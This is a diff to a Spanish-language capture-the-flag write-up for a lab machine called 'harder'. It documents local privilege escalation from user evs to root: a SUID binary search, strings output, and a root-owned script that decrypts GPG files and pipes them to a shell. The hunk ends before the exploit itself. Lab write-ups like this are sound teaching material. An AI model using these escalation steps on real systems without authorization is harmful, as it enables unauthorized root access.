@@ -354,9 +354,42 @@ Bingo el script trae sorpresa credenciales para conectarnos por ssh  con el usua
 
 Existen dos metodos para llegar a ser root desde el usuario evs.
 
-Metodo 1:
+Metodo 1: Mediante firma GNU Privacy Guard (GPG)
 
+--Buscamos binarios que tengan el SUID activo
 
-
+	harder:~$ find / -perm -4000 2>/dev/null | xargs ls -la
  
+	-rwsr-x---    1 root     evs          19960 Jul  6  2020 /usr/local/bin/execute-crypted  
+	
+--Con el comando strings intentamos ver si encontramos algo dentro del binario que nos sea de utilidad, encontramos un script dentro de la misma ruta del binario.
+
+	harder:/usr/local/bin$ strings execute-crypted 
+ 
+		/usr/local/bin/run-crypted.sh %s
+		/usr/local/bin/run-crypted.sh
+
+ 	harder:/usr/local/bin$ ls -la
+		total 32
+		drwxr-xr-x    1 root     root          4096 Jul  7  2020 .
+		drwxr-xr-x    1 root     root          4096 May 29  2020 ..
+		-rwsr-x---    1 root     evs          19960 Jul  6  2020 execute-crypted
+		-rwxr-x---    1 root     evs            412 Jul  7  2020 run-crypted.sh
+
+  --Contenido de run-crypted.sh 
+
+		harder:/usr/local/bin$ cat run-crypted.sh 
+			#!/bin/sh
+
+			if [ $# -eq 0 ]
+			then
+				 echo -n "[*] Current User: ";
+				 whoami;
+				 echo "[-] This program runs only commands which are encypted for root@harder.local using gpg."
+				 echo "[-] Create a file like this: echo -n whoami > command"
+				 echo "[-] Encrypt the file and run the command: execute-crypted command.gpg"
+			else
+				export GNUPGHOME=/root/.gnupg/
+				gpg --decrypt --no-verbose "$1" | ash
+			fi
 
